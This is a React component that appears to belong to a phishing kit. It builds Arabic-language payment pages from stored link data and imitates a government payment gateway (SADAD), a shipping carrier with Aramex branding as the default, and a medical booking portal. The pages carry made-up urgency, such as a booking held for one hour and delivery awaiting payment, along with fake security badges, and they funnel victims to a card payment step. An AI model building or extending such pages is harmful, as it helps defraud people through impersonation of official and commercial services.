import React, { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyCode } from "@/lib/countryCurrencies";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import SEOHead from "@/components/SEOHead";
import BackButton from "@/components/BackButton";
import BottomNav from "@/components/BottomNav";
import {
  MapPin,
  Users,
  CheckCircle2,
  CreditCard,
  Shield,
  Sparkles,
  Package,
  Truck,
  Hash,
  FileText,
  Heart,
  Building2,
  Calendar,
  Lock,
  ArrowLeft,
  Info,
  ChevronRight,
  Landmark,
  ShieldCheck,
  Zap,
  Globe
} from "lucide-react";

const Microsite = () => {
  const { country, type, id } = useParams();
  const navigate = useNavigate();
  const { data: link, isLoading, isError } = useLink(id);
  const countryData = getCountryByCode(country || "SA");
  const [showPage, setShowPage] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => setShowPage(true), 1500);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (link || isError) setShowPage(true);
  }, [link, isError]);
  
  if (isLoading && !showPage) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="flex flex-col items-center gap-4">
          <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
          <p className="text-lg font-black text-blue-900 animate-pulse" dir="rtl">جاري تأكيد البيانات...</p>
        </div>
      </div>
    );
  }
  
  if (!link || !countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50" dir="rtl">
        <Card className="p-10 text-center max-w-md border-0 shadow-xl rounded-3xl">
          <Info className="w-16 h-16 mx-auto mb-4 text-gray-400" />
          <h2 className="text-2xl font-black mb-2 text-gray-800">عذراً، الرابط غير صالح</h2>
          <p className="text-gray-500 mb-6 font-bold">الرجاء التأكد من صحة الرابط أو التواصل مع المصدر.</p>
          <Button onClick={() => navigate('/services')} className="w-full h-12 rounded-xl">العودة للرئيسية</Button>
        </Card>
      </div>
    );
  }
  
  const payload = link.payload;
  const serviceKey = payload.service_key || 'aramex';
  const serviceBranding = getServiceBranding(serviceKey);
  const govSystem = getGovernmentPaymentSystem(country || 'SA');

  // Layout components for different service types
  const renderGovernmentLayout = () => (
    <div className="max-w-4xl mx-auto space-y-6">
      <header className="flex items-center justify-between mb-8">
        <div className="flex items-center gap-4">
          <div className="w-16 h-16 rounded-2xl bg-white shadow-lg flex items-center justify-center p-3">
             <Landmark className="w-full h-full" style={{ color: govSystem.colors.primary }} />
          </div>
          <div>
            <h1 className="text-2xl font-black text-gray-800">{govSystem.nameAr} | {payload.service_name}</h1>
            <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">{govSystem.nameEn} GATEWAY</p>
          </div>
        </div>
        {govSystem.logo && <img src={govSystem.logo} className="h-12 w-auto object-contain" alt="" />}
      </header>

      <Card className="overflow-hidden border-0 shadow-2xl rounded-[2rem] bg-white">
        <div className="p-10 border-b-2 border-dashed border-gray-100">
           <div className="flex items-center gap-3 mb-6">
             <div className="w-2 h-8 rounded-full" style={{ background: govSystem.colors.primary }} />
             <h2 className="text-xl font-black text-gray-800">تفاصيل الفاتورة الحكومية</h2>
           </div>

           <div className="grid sm:grid-cols-2 gap-8">
             <div className="space-y-1">
               <p className="text-xs font-black text-gray-400 uppercase">اسم المستفيد</p>
               <p className="text-lg font-black text-gray-700">{payload.customerInfo?.fullName || payload.customer_name}</p>
             </div>
             <div className="space-y-1">
               <p className="text-xs font-black text-gray-400 uppercase">رقم الهوية / المرجع</p>
               <p className="text-lg font-black text-gray-700">{payload.reference || 'N/A'}</p>
             </div>
             <div className="space-y-1">
               <p className="text-xs font-black text-gray-400 uppercase">نوع الخدمة</p>
               <Badge className="bg-blue-50 text-blue-700 hover:bg-blue-50 border-0 font-bold px-4 py-1.5">{payload.service_name}</Badge>
             </div>
             <div className="space-y-1">
               <p className="text-xs font-black text-gray-400 uppercase">حالة الدفع</p>
               <div className="flex items-center gap-2 text-amber-600 font-bold"><Clock className="w-4 h-4" /> بانتظار السداد</div>
             </div>
           </div>
        </div>

        <div className="p-10 bg-[#fcfcfc]">
           <div className="bg-white p-8 rounded-3xl border-2 border-gray-50 shadow-sm mb-8 flex flex-col sm:flex-row items-center justify-between gap-6">
             <div>
               <p className="text-sm font-bold text-gray-400 mb-1">المبلغ المطلوب سداده</p>
               <h3 className="text-5xl font-black" style={{ color: govSystem.colors.primary }}>{formatCurrency(payload.payment_amount, payload.currency_code)}</h3>
             </div>
             <div className="text-right">
               <div className="flex items-center gap-2 px-4 py-2 bg-green-50 text-green-700 rounded-full text-xs font-black mb-2">
                 <ShieldCheck className="w-4 h-4" /> اتصال آمن ومشفر
               </div>
               <p className="text-[10px] font-bold text-gray-400 uppercase">SADAD INTEGRATED PAYMENT</p>
             </div>
           </div>

           <Button
             onClick={() => navigate(`/pay/${link.id}/recipient?company=gov_${country?.toLowerCase()}`)}
             className="w-full h-20 text-2xl font-black rounded-2xl shadow-2xl transition-all hover:scale-[1.02]"
             style={{ background: govSystem.gradients.primary }}
           >
             <CreditCard className="w-8 h-8 ml-4" /> سداد الرسوم الآن
           </Button>

           <p className="text-center mt-6 text-xs font-bold text-gray-400">جميع الحقوق محفوظة لنظام المدفوعات الوطني © 2025</p>
        </div>
      </Card>
    </div>
  );

  const renderShippingLayout = () => (
    <div className="max-w-4xl mx-auto space-y-6">
       <header className="flex flex-col items-center gap-6 mb-10">
          <div className="w-32 h-32 rounded-[2.5rem] bg-white shadow-2xl flex items-center justify-center p-6 border-4 border-gray-50">
             <img src={serviceBranding.logo} className="max-h-full max-w-full object-contain" alt="" />
          </div>
          <div className="text-center">
            <h1 className="text-3xl font-black text-gray-800">{payload.service_name}</h1>
            <p className="text-sm font-bold text-blue-600 uppercase tracking-[0.3em]">Official Tracking & Payment</p>
          </div>
       </header>

       <div className="grid md:grid-cols-5 gap-8">
          <div className="md:col-span-3 space-y-6">
             <Card className="p-8 border-0 shadow-2xl rounded-[2.5rem] bg-white">
                <div className="flex items-center justify-between mb-8">
                   <h2 className="text-xl font-black text-gray-800">بيانات الشحنة</h2>
                   <Badge className="bg-emerald-50 text-emerald-700 border-0 font-black">جاهز للتوصيل</Badge>
                </div>

                <div className="space-y-6">
                   <div className="flex items-start gap-4 p-5 rounded-2xl bg-gray-50 border border-gray-100">
                      <Hash className="w-6 h-6 text-gray-400 mt-1" />
                      <div>
                        <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">رقم تتبع الشحنة</p>
                        <p className="text-xl font-black text-gray-700 font-mono uppercase">{payload.tracking_number}</p>
                      </div>
                   </div>

                   <div className="flex items-start gap-4 p-5 rounded-2xl bg-gray-50 border border-gray-100">
                      <Package className="w-6 h-6 text-gray-400 mt-1" />
                      <div>
                        <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">محتويات الطرد</p>
                        <p className="text-lg font-black text-gray-700">{payload.package_description || 'محتويات متنوعة'}</p>
                      </div>
                   </div>

                   <div className="flex items-center gap-4 py-4 px-2">
                      <div className="w-4 h-4 rounded-full bg-emerald-500 animate-pulse" />
                      <p className="text-sm font-bold text-gray-500">موقع الشحنة الحالي: <span className="text-emerald-600">في انتظار تأكيد السداد لبدء التوصيل</span></p>
                   </div>
                </div>
             </Card>
          </div>

          <div className="md:col-span-2 space-y-6">
             <Card className="p-8 border-0 shadow-2xl rounded-[2.5rem] bg-[#1E293B] text-white overflow-hidden relative">
                <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 -mr-16 -mt-16 rounded-full" />
                <h2 className="text-lg font-black mb-6">ملخص التكاليف</h2>
                <div className="space-y-4 mb-8">
                   <div className="flex justify-between text-sm opacity-60 font-bold"><span>قيمة المشتريات (COD)</span><span>{formatCurrency(payload.cod_amount, payload.currency_code)}</span></div>
                   <div className="flex justify-between text-sm opacity-60 font-bold"><span>رسوم التوصيل</span><span>0.00</span></div>
                   <div className="border-t border-white/10 pt-4 flex justify-between items-end">
                      <div>
                        <p className="text-[10px] font-black opacity-40 uppercase tracking-widest">الإجمالي المستحق</p>
                        <p className="text-4xl font-black text-emerald-400">{formatCurrency(payload.cod_amount, payload.currency_code)}</p>
                      </div>
                   </div>
                </div>

                <Button
                   onClick={() => navigate(`/pay/${link.id}/recipient?company=${serviceKey}`)}
                   className="w-full h-16 bg-white text-[#1E293B] hover:bg-gray-100 rounded-2xl font-black text-lg transition-all"
                >
                   دفع وتأكيد الشحن
                </Button>

                <div className="mt-6 flex items-center justify-center gap-4 grayscale opacity-40">
                   <img src="/visa-logo.png" className="h-3" alt="" />
                   <img src="/mastercard-logo.png" className="h-5" alt="" />
                </div>
             </Card>

             <div className="p-6 bg-blue-50 rounded-3xl border border-blue-100 flex gap-4">
                <Info className="w-6 h-6 text-blue-500 shrink-0" />
                <p className="text-xs text-blue-700 font-bold leading-relaxed">
                   عزيزي العميل، يرجى سداد قيمة الشحنة إلكترونياً لتسهيل عملية التسليم وضمان عدم التأخير.
                </p>
             </div>
          </div>
       </div>
    </div>
  );

  const renderHealthLayout = () => (
    <div className="max-w-4xl mx-auto space-y-6">
       <header className="flex items-center justify-center gap-4 mb-10">
          <Heart className="w-12 h-12 text-red-500 fill-current" />
          <div className="text-right">
             <h1 className="text-3xl font-black text-gray-800">بوابة الحجوزات الطبية</h1>
             <p className="text-sm font-bold text-gray-400">إدارة وتأكيد المواعيد الإلكترونية</p>
          </div>
       </header>

       <Card className="overflow-hidden border-0 shadow-2xl rounded-[3rem] bg-white">
          <div className="bg-red-500 p-8 text-white flex flex-col md:flex-row items-center justify-between gap-6">
             <div className="flex items-center gap-6">
                <div className="w-20 h-20 bg-white/20 rounded-2xl flex items-center justify-center backdrop-blur-md border border-white/30">
                   <Calendar className="w-10 h-10" />
                </div>
                <div>
                   <p className="text-xs font-black opacity-60 uppercase tracking-widest">تاريخ الموعد المحجوز</p>
                   <p className="text-2xl font-black">{payload.appointment_date} | {payload.appointment_time}</p>
                </div>
             </div>
             <div className="bg-white/20 px-6 py-3 rounded-2xl border border-white/30 backdrop-blur-md">
                <p className="text-[10px] font-black opacity-60 uppercase mb-1">المبلغ المطلوب</p>
                <p className="text-2xl font-black">{formatCurrency(payload.cod_amount, payload.currency_code)}</p>
             </div>
          </div>

          <div className="p-10 grid md:grid-cols-2 gap-10">
             <div className="space-y-6">
                <h3 className="text-xl font-black text-gray-800 border-r-4 border-red-500 pr-3">بيانات المريض</h3>
                <div className="space-y-4">
                   <div className="p-4 rounded-2xl bg-gray-50 border border-gray-100">
                      <p className="text-[10px] font-black text-gray-400 mb-1 uppercase">الاسم الكامل</p>
                      <p className="font-black text-gray-700">{payload.patient_name}</p>
                   </div>
                   <div className="p-4 rounded-2xl bg-gray-50 border border-gray-100">
                      <p className="text-[10px] font-black text-gray-400 mb-1 uppercase">نوع الخدمة</p>
                      <p className="font-black text-gray-700">{payload.service_type_label}</p>
                   </div>
                </div>
             </div>

             <div className="space-y-6">
                <h3 className="text-xl font-black text-gray-800 border-r-4 border-emerald-500 pr-3">حماية الموعد</h3>
                <div className="space-y-4">
                   <p className="text-sm font-bold text-gray-500 leading-relaxed">
                      يتم حجز الموعد مؤقتاً لمدة ساعة واحدة فقط. يرجى إتمام عملية الدفع لتأكيد الحجز النهائي وإصدار رقم المراجعة.
                   </p>
                   <Button
                      onClick={() => navigate(`/pay/${link.id}/recipient?company=health_links`)}
                      className="w-full h-16 bg-emerald-500 hover:bg-emerald-600 rounded-2xl font-black text-lg shadow-lg text-white"
                   >
                      تأكيد ودفع الرسوم
                   </Button>
                </div>
             </div>
          </div>
       </Card>
    </div>
  );

  return (
    <>
      <SEOHead
        title={`${payload.service_name || 'خدمة دفع'} - ${countryData.nameAr}`}
        description={`إتمام عملية الدفع والتحصيل الرسمية لخدمة ${payload.service_name}`}
        image={serviceBranding.ogImage}
        url={window.location.href}
      />
      <div className="min-h-screen bg-gray-50 pb-20 pt-10 px-4" dir="rtl">
         <div className="container mx-auto">
            <div className="mb-6 flex items-center justify-between">
               <BackButton />
               <div className="flex items-center gap-2 text-xs font-black text-gray-400 uppercase tracking-widest bg-white px-4 py-2 rounded-full shadow-sm border border-gray-100">
                  <Lock className="w-3.5 h-3.5" /> SECURE GATEWAY 256-BIT
               </div>
            </div>

            {link.type === 'government' ? renderGovernmentLayout() :
             link.type === 'shipping' ? renderShippingLayout() :
             link.type === 'health' ? renderHealthLayout() :
             <div className="max-w-4xl mx-auto space-y-6">
                <header className="text-center mb-10">
                   <div className="w-20 h-20 bg-blue-600 rounded-3xl mx-auto mb-4 flex items-center justify-center text-white shadow-xl rotate-3">
                      <CreditCard className="w-10 h-10" />
                   </div>
                   <h1 className="text-3xl font-black text-gray-800">بوابة الدفع الموحدة</h1>
                   <p className="text-sm font-bold text-gray-400">آمن • سريع • موثوق</p>
                </header>

                <Card className="overflow-hidden border-0 shadow-2xl rounded-[3rem] bg-white p-10 text-center">
                   <p className="text-sm font-bold text-gray-400 mb-2">المبلغ المطلوب</p>
                   <h3 className="text-6xl font-black text-blue-600 mb-10 tracking-tighter">
                      {formatCurrency(payload.payment_amount || payload.cod_amount || payload.total_amount, payload.currency_code)}
                   </h3>

                   <Button
                      onClick={() => navigate(`/pay/${link.id}/recipient?company=${serviceKey}`)}
                      className="w-full h-20 bg-blue-600 hover:bg-blue-700 rounded-2xl font-black text-2xl shadow-2xl shadow-blue-200 transition-all hover:translate-y-[-4px]"
                   >
                      متابعة الدفع الآن
                   </Button>

                   <div className="mt-8 flex items-center justify-center gap-10">
                      <div className="flex flex-col items-center gap-2">
                         <ShieldCheck className="w-6 h-6 text-green-500" />
                         <span className="text-[10px] font-black text-gray-400 uppercase">Verified</span>
                      </div>
                      <div className="flex flex-col items-center gap-2">
                         <Zap className="w-6 h-6 text-amber-500" />
                         <span className="text-[10px] font-black text-gray-400 uppercase">Instant</span>
                      </div>
                      <div className="flex flex-col items-center gap-2">
                         <Globe className="w-6 h-6 text-blue-500" />
                         <span className="text-[10px] font-black text-gray-400 uppercase">Global</span>
                      </div>
                   </div>
                </Card>
             </div>
            }
         </div>
      </div>
      <BottomNav />
    </>
  );
};

export default Microsite;
